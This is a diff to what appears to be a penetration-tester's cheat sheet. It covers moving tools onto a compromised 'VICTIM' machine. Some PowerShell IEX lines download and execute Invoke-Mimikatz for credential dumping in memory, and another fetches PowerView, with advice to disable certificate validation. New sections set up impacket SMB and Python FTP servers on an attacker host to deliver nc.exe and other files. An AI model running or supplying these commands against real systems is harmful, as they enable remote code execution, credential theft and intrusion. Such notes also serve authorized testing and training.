@@ -141,14 +141,27 @@ stty -rows 48 -columns 120
 ## PowerShell - IEX
 - VICTIM: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
  
-- VICTIM: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+- VICTIM: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`
 
 ## PowerShell Invoke-WebRequest (PowerShell 3.0 and higher)
 - VICTIM: `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
 
-USE:
+You should also use these arguments:
 - -UseBasicParsing
 - [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+## SMB
+- KALI: `sudo impacket-smbserver share -smb2support /tmp/`
+- VICTIM: `copy \\192.168.1.13\share\nc.exe`
+
+If you get an error, use an account name and password:
+- KALI: `sudo impacket-smbserver share -smb2support /tmp/smbshare -user gajos -password gajos`
+- VICTIM: `net use g: \\192.168.1.13\share /user:test test`
+
+## FTP
+- KALI: `sudo pip3 install pyftpdlib`
+- KALI: `sudo python3 -m pyftpdlib --port 21`
+- VICTIM: `(New-Object Net.WebClient).DownloadFile('ftp://192.168.1.13/file', 'file')`
 
 # Redis
 
